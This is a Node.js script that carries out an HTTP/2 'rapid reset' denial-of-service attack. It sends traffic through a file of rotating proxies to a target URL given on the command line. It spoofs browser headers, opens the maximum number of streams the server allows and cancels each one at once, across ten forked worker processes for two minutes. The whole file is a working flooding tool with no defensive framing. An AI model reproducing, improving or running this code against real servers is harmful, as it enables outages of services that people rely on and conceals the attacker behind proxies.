const net = require('net');
const cluster = require('cluster');
const os = require('os');
const URL = require('url');
const fs = require('fs');
const tls = require('tls');
const http = require('http');
const http2 = require('http2');
const crypto = require('crypto');

const proxies = fs.readFileSync('http.txt', 'utf-8').split('\n').filter(Boolean);

process.on('uncaughtException', function (e) {
    console.error('Uncaught Exception:', e);
}).on('unhandledRejection', function (e) {
    console.error('Unhandled Rejection:', e);
}).on('warning', e => {
    console.warn('Warning:', e);
}).setMaxListeners(0);

const ciphersList = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_CHACHA20_POLY1305_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA",
    "TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA",
    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA",
    "TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA",
    "TLS_RSA_WITH_AES_128_GCM_SHA256",
    "TLS_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_RSA_WITH_AES_128_CBC_SHA",
    "TLS_RSA_WITH_AES_256_CBC_SHA"
];


function generate_payload() {
    let headers = "";
    headers += 'GET ' + process.argv[2] + ' HTTP/1.1' + '\r\n';
    headers += 'Host: ' + URL.parse(process.argv[2]).host + '\r\n';
    headers += "\r\n";
    return headers;
}

function getRandomProxy() {
    const randomIndex = Math.floor(Math.random() * proxies.length);
    return proxies[randomIndex];
}

async function conn() {
    const target = URL.parse(process.argv[2]);

    setInterval(async function () {
        const randomProxy = getRandomProxy();
        const [proxyHost, proxyPort] = randomProxy.split(':');

        const socket = net.connect(proxyPort, proxyHost, () => {
            const connectReq = [
                `CONNECT ${target.host}:${target.port || 443} HTTP/1.1`,
                `Host: ${target.host}`,
                '',
                ''
            ].join('\r\n');
            socket.write(connectReq);
        });

        socket.on('data', (data) => {
            //console.log('Raw Socket Data:', data.toString());
            if (/^HTTP\/1.1 200 Connection established\r\n/.test(data.toString())) {
                const tlsOptions = {
                    socket: socket,
                    ALPNProtocols: ['h2', 'http/1.1'],
                    host: target.host,
                    servername: target.host,
                    rejectUnauthorized: false,
                    checkServerIdentity: () => undefined,
                    ciphers: ciphersList.join(':'),
                    secure: true,
                    honorCipherOrder: true,
                    secureProtocol: "TLS_client_method",
                    secureOptions: {
                        "signature_algorithms": [
                            "ecdsa_secp256r1_sha256",
                            "ecdsa_secp384r1_sha384",
                            "ecdsa_secp521r1_sha512",
                            "rsa_pss_rsae_sha256",
                            "rsa_pss_rsae_sha384",
                            "rsa_pss_rsae_sha512",
                            "rsa_pkcs1_sha256",
                            "rsa_pkcs1_sha384",
                            "rsa_pkcs1_sha512",
                            "ecdsa_sha1",
                            "rsa_pkcs1_sha1"
                        ],
                        "supported_groups": [
                            "X25519",
                            "P-256",
                            "P-384",
                            "P-521",
                            "ffdhe2048",
                            "ffdhe3072"
                        ]
                    }
                };

                const tlsSocket = tls.connect(tlsOptions, () => {
                    if (!tlsSocket.authorized) {
                        console.error('TLS Authorization Error:', tlsSocket.authorizationError);
                        return;
                    }
                    let maxStreams = 1073741824;

                    const session = http2.connect(`https://${target.host}`, {
                        createConnection: () => tlsSocket,
                        settings: {
                            headerTableSize: 65536,
                            maxConcurrentStreams: maxStreams,
                            initialWindowSize: 131072,
                            maxFrameSize: 16384
                        }
                    });

                    session.on('error', (err) => {
                        //console.error('Session Error:', err);
                    });

                    session.on('remoteSettings', (settings) => {
                        if (settings.maxConcurrentStreams) {
                            maxStreams = settings.maxConcurrentStreams;
                        }

                        for (let i = 0; i < maxStreams; i++) {
                            createAndRapidlyResetStream(session);
                        }
                    });
                });
                tlsSocket.on('data', (data) => {
                    //console.log('TLS Socket Data:', data.toString());
                });

                tlsSocket.on('error', err => {
                    //console.error('TLS Socket Error:', err);
                });

                socket.removeAllListeners('data');
            }
        });

        socket.on('error', (err) => {
            //console.error('Socket Error:', err);
        });

    }, 0);
}

function createAndRapidlyResetStream(session) {
    const target = URL.parse(process.argv[2]);

    if (session.closed) {
        return;
    }

    const customHeaders = {
        ':method': 'GET',
        ':path': target.pathname || '/',
        ':authority': target.host,
        ':scheme': 'https',
        'user-agent': getRandomUserAgent(),
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.9',
        'accept-encoding': 'gzip, deflate, br',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'none',
        'sec-fetch-user': '?1',
        'te': 'trailers'
    };

    const req = session.request(customHeaders);
    req.on('response', (headers) => {
        console.log(`Received status code: ${headers[':status']}`);
        req.close(http2.constants.NGHTTP2_NO_ERROR);
    });
    req.on('error', (err) => {
        //console.error('req Error:', err);
    });
    req.on('end', () => {
        createAndRapidlyResetStream(session);
    });
}

function getRandomUserAgent() {
    const userAgentList = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0',
    ];

    return userAgentList[Math.floor(Math.random() * userAgentList.length)];
}


function generateRandomPath() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';

    function getRandomChar() {
        return chars[Math.floor(Math.random() * chars.length)];
    }

    let randomPath = '/';
    const pathLength = Math.floor(Math.random() * 100) + 10;

    for (let i = 0; i < pathLength; i++) {
        randomPath += getRandomChar();
    }

    randomPath += '?';

    const queryStringLength = Math.floor(Math.random() * 50) + 10;

    for (let i = 0; i < queryStringLength; i++) {
        randomPath += getRandomChar();
    }

    return randomPath;
}



if (cluster.isMaster) {
    for (let i = 0; i < 10; i++) {
        cluster.fork();
    }
} else {
    conn();
    setTimeout(() => {
        process.exit(4);
    }, (120 * 1000));
}
